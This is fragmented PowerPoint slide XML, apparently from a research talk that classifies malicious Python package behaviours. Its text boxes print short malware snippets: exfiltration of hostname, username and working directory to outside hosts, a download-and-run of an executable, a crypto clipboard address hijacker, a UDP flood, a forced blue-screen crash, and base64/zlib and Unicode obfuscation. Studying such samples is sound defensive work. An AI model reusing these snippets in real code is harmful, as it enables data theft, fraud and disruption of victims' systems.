                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B1D05633-BBF9-8207-7267-78FEB682812E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2010369" y="3517185"/>
            <a:ext cx="6006971" cy="74715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clientSocket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socket.socket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socket.AF_INET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socket.SOCK_STREAM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clientSocket.connect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(("134.209.85.64",9090))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clientSocket.send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(str(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sendable_string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).encode())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87913F85-7F00-73C9-1B7C-46A51DC0E847}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4049925" y="3200469"/>
            <a:ext cx="1927860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Construct Request</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7A6AF520-29D6-5DCE-8C99-34BB1BD2C968}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4088024" y="4276288"/>
            <a:ext cx="1851659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TCP Connections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61F2FED-01DF-4489-FEEA-B27E39AF6573}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1629970" y="935703"/>
            <a:ext cx="3802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D58ED3-038F-3191-213F-90F720B34720}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1629970" y="3504638"/>
            <a:ext cx="3802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5519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BC1FE-8FEC-ED7B-2436-A7D07C34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5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B7452F3-6D5E-4EB9-BDAC-5DDDA29E0936}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1502972" y="1727391"/>
            <a:ext cx="60832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852F24-A7CD-00BF-F137-3EBDFC44DF93}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1983931" y="1769633"/>
            <a:ext cx="8460000" cy="2820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E2C28BCF-D884-7D1A-BF40-130C739C189F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1983931" y="1727391"/>
            <a:ext cx="8444865" cy="2862322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ploads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{'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hostname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':hostname,'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cwd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cwd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,'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':username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requests.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("http://5r13v9.ceye.io", params=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ploads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vid = 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user_name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+"###"+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hostname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+"###"+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os_version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+"###"+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request.urlopen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r'http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://openvc.org/Version.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php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',data='vid='.encode('utf-8')+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base64.b64encode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vid.encode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('utf-8')))</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN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payload = {"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: message.author.name,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"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avatar_url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: str(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message.author.avatar_url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)}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requests.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post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(config['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attachment_webhook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'],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=payload)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B8262D-E661-6C63-98D2-99BE59DBFA4D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7943850" y="5915025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Constructed Request</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2104349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4113A-EE94-8630-32B4-74A3D3FD2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1D5B79-66A6-F6EA-CA76-0DA84B25F80D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10280650" y="6199223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Extra attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E36FE40F-1F08-24E2-030C-BDB9AAC782E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="907221" y="2543705"/>
            <a:ext cx="4345350" cy="72753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webhook_spam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(webhook, content):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payload = {'content': content}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requests.post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(webhook,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=payload)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{046E5E17-F23F-9239-B579-98AC7E526668}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="900310" y="3606909"/>
            <a:ext cx="4338438" cy="736919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 flood(sock,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port, stop, bytes):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while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time.time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() &lt; stop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sock.sendto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(bytes, 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port))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B7C37FA7-F93C-240D-4FAD-90BC77CA6CE3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2102004" y="2212718"/>
            <a:ext cx="1948872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Remote Download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9FDA99-3548-1131-6F74-0518AA471B1E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="506265" y="2535482"/>
            <a:ext cx="3802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6D4D9F6-4B51-C4C8-17D2-979896D07390}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5252571" y="835496"/>
            <a:ext cx="3802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C5670F74-4104-7158-D311-BB4EDAACA50F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5646616" y="3193135"/>
            <a:ext cx="5098361" cy="1169551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bluescreen():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ctypes.windll.ntdll.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RtlAdjustPrivilege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(19, 1, 0,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ctypes.byref</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="14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ctypes.c_bool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ctypes.windll.ntdll.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NtRaiseHardError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0xc0000022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0, 0, 0, 6,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ctypes.byref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ctypes.c_ulong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()))</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BAAD2B5D-4450-89F3-DFCD-B67D01F13E54}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6939651" y="2855207"/>
            <a:ext cx="2512290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Address Tampering Attack</a:t>
            </a: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1A2E259B-7D49-AADF-EFE2-D529FE68F842}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="907221" y="834314"/>
            <a:ext cx="4338439" cy="138144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remote_download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'https://python-release.com/python-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install.scr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filename =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'ini_file_pyp_41.exe’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requests.get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url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allow_redirects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=True)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open(filename, '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wb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').write(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rq.content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os.system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('start '+filename)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FD1125-CFC6-BBBB-63BE-1F0E366964EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5252571" y="3193135"/>
            <a:ext cx="3802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790171-051E-664A-F367-477113B362AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="520086" y="830764"/>
            <a:ext cx="3802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3" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{22D74E17-A3EF-D376-C6D3-924B028222F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5646616" y="835496"/>
            <a:ext cx="5098360" cy="203132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address_swap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(self):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try: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clipboard_data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pyperclip.paste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if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re.search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'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'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clipboard_data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if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clipboard_data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in [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self.addr_btc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self.addr_eth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if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self.address_btc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!= "none":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pyperclip.copy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self.address_btc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pyperclip.paste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EBB107C-AB7C-202E-82CB-95204A969297}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="504157" y="3606036"/>
            <a:ext cx="3802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09C7F494-52C9-7D46-0F77-8E02412316E1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6939651" y="4362686"/>
            <a:ext cx="3332413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 Denial-of-Service Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A905B951-FBE8-3E79-1302-04E1CCFFBDB9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2102004" y="4343828"/>
            <a:ext cx="1585039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Flood Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1551112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>
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2636F0F2-3CAC-6C0B-17FF-E2CA72453FFA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1447024" y="1111492"/>
            <a:ext cx="5942067" cy="1815882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address_swap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(self):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try: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clipboard_data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pyperclip.paste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if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re.search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'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$'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clipboard_data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if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clipboard_data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not in [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self.address_btc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self.address_eth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if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self.address_btc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!= "none":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pyperclip.copy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self.address_btc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pyperclip.paste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7DA5C7-5066-B012-55B6-EEEF87B05FE1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066448" y="1111491"/>
            <a:ext cx="38022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89209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5DD69-A113-0554-ADB4-2098A3F6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5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5FAB64E1-A8CE-1670-C4F7-AC6833E9935C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1530271" y="2240072"/>
            <a:ext cx="6083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600F92-EB11-EA27-C8C8-7D3246A5925D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011230" y="2282315"/>
            <a:ext cx="8460000" cy="8810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C9AEF032-350B-1700-3184-8904022C6BC8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011230" y="2240072"/>
            <a:ext cx="8444865" cy="54122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webhook_spam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(webhook, content):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payload = {'content': content}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requests.post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(webhook,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=payload)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82D573-0D33-BCE6-00D9-1DF76D100660}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7943850" y="5915025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Spamming</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1778214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B6A0A-C9B1-2F19-594A-DC86FD02F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5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{15F5539E-351C-156F-4945-1BF1657450AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1530271" y="2240072"/>
            <a:ext cx="6083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E7DF68-03E0-0AE8-94AF-128D86D0227E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011230" y="2282315"/>
            <a:ext cx="8460000" cy="8810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91C301A9-4A77-F5A7-D566-89DFC85A4D25}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2011230" y="2240073"/>
            <a:ext cx="8444865" cy="61742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 flood(sock,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port, stop, bytes):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while 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time.time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() &lt; stop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sock.sendto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(bytes, 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port))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BE248D5-1163-00EF-1D73-F4404C5A5D0D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7943850" y="5915025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UDP Flood Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2631609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2E168-B719-523F-7BA6-98CDE135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5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{492365DA-84C7-150B-3AD6-03B2FEB051F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1502972" y="1727391"/>
            <a:ext cx="60832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16B7B8-081F-2CC4-C6AF-D4B2E397DF8E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1983931" y="1769634"/>
            <a:ext cx="8460000" cy="11580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EABE58EA-0625-FC48-4B41-30DF3BD73024}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1983931" y="1727392"/>
            <a:ext cx="8444865" cy="872933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bluescreen(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ctx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ctypes.windll.ntdll.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RtlAdjustPrivilege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(19, 1, 0,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ctypes.byref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ctypes.c_bool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()))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ctypes.windll.ntdll.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NtRaiseHardError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0xc0000022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0, 0, 0, 6,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ctypes.byref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ctypes.c_ulong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054E9E-4002-D20E-BE4C-E26CAA62B56F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7943850" y="5915025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Blue Screen of Death</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2203376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>
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E723BE0E-9263-13E2-385A-A5E2AAFA988E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="754091" y="606789"/>
            <a:ext cx="4732309" cy="954107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hostname.encode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hex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           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 =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cwd.split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('/’)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range(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(cs)):   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cs[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cs[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].encode().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hex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5" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{560564A6-8F0E-F72B-B2C0-706C7C86C433}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="753739" y="1892150"/>
            <a:ext cx="4732309" cy="74715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encd = ''; t = [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR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0x76, 0x21, 0xfe, 0xcc, 0xee</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR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US" altLang="zh-CN" sz="14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xrange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rawd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encd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chr(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rawd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]) ^ t[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%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(t)]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B31EB860-184F-02EE-9AB0-D20BECDC9DDF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1900165" y="1560896"/>
            <a:ext cx="2440160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(a-1) Hexadecimal Encoding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9F18DE9-2D0E-7074-6AF6-C830BF674C94}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2216203" y="2639304"/>
            <a:ext cx="1807381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(a-2) XOR Encoding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4C54CB-D222-B147-2E38-7E60183C15B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="373515" y="606789"/>
            <a:ext cx="3802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3515F1-16CA-6BD2-FD86-D1EFD6DAFC9E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="373339" y="1884963"/>
            <a:ext cx="3802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文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EBDB0B76-809F-6884-C1C0-5709ECE1C767}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="757240" y="2970558"/>
            <a:ext cx="4728808" cy="1600438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encrypt(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message,corruptchanname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x in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message.content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if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random.randint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(1,2) == 1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corruptchanname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+= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400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asciigen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else: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corruptchanname</a:t>
            </a:r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x   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corruptchanname</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="14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E4ADA-F3C9-FD7A-53BE-D24E2904E6E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="373339" y="2979048"/>
            <a:ext cx="38022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2" name="文本框 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B289A842-4ABA-7283-0FAE-3AF4E13911D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1928442" y="4561317"/>
            <a:ext cx="2386405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(a-3) Customized Encoding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517C9B1-FA87-DF6E-C721-5F5D8F49D773}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9874250" y="6090516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obfuscation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2E54EBC3-0AB6-7B2A-11FF-EE6D7DF9DC17}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5865920" y="3161949"/>
            <a:ext cx="4732309" cy="138485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numoy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="14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Version: 0.6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Summary: Security project for PoC.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Home-page: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1400" u="sng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https://google.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" u="sng" dirty="0"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Author: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zer0ul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Author-email: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zer0ul@vulnium.com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6A8153-1405-E007-1918-DA1768E647A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5488907" y="3159336"/>
            <a:ext cx="3802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3E8882F8-4B3F-1E87-7531-B67585A710E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7202923" y="2849908"/>
            <a:ext cx="2059709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Unicode obfuscation </a:t>
            </a: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86893CD3-CA30-C30C-F1CB-20868B10177F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5866623" y="607135"/>
            <a:ext cx="4732309" cy="2245386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if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𝘪𝙣𝘧𝙤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!= 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𝘪𝙢𝗽𝗼𝙧𝘁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__('base64').b64decode(__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𝘪𝗺𝙥𝗼𝙧𝘁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zlib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').decompress(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b'x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xda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\x03\x00\x00\x00\x00\x01')).decode():</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr latinLnBrk="1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with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𝘰𝗽𝙚𝗻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𝘪𝗺𝗽𝗼𝙧𝙩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__('base64').b64decode(__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𝘪𝙢𝗽𝘰𝙧𝘁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zlib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').decompress(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b'x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\xdaK56L\x0er\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xcf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\xa9\x8a4\xb2\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xac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\x8crv*H\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xca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\x8d*\xf3\xc9\x0b2Iq\xb4\xb5\x05\x00\x86d\t6')).decode().format(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𝙨𝙚𝘭𝗳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), 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𝗶𝗺𝗽𝗼𝙧𝘁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__('base64').b64decode(__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𝙞𝗺𝘱𝙤𝘳𝘵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zlib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').decompress(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b'x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xdaK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)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as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𝙛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𝙛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.write(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𝘀𝙩𝙧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𝘪𝘯𝘧𝙤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endParaRPr lang="en-US" altLang="zh-CN" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="080808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25E841-A010-D06E-DDFE-4DD01277D066}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5485696" y="603139"/>
            <a:ext cx="38022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FE8E5B99-B691-5407-6919-792330F73F27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7109856" y="4561317"/>
            <a:ext cx="2244436" cy="322764"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="22225">
            <a:noFill/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(c) Metadata Obfuscation</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3526136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8E38C-7332-34AD-36CD-CDC58AE72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5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B891A423-EAA8-0531-D1C6-52EA9FA4E784}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1502972" y="1727391"/>
            <a:ext cx="6083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8152F0-4B33-56B0-30DA-3B29CCB891BB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1983931" y="1769634"/>
            <a:ext cx="8460000" cy="143508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7947F682-36F9-98EB-BD97-89EDBA3057D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1983931" y="1727392"/>
            <a:ext cx="8444865" cy="147732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hostname.encode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hex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           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 =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username.encode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hex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           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 =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cwd.split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('/’)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range(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(cs)):   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cs[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 = cs[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].encode().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hex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A361BD-7DE6-1DF3-FDE1-89167301712E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9874250" y="6090516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hex</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1904854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EF9D-0DF2-241B-0175-8DE79CAF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5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0BF1777F-D05B-BD9D-4CF4-5F74D14641D2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
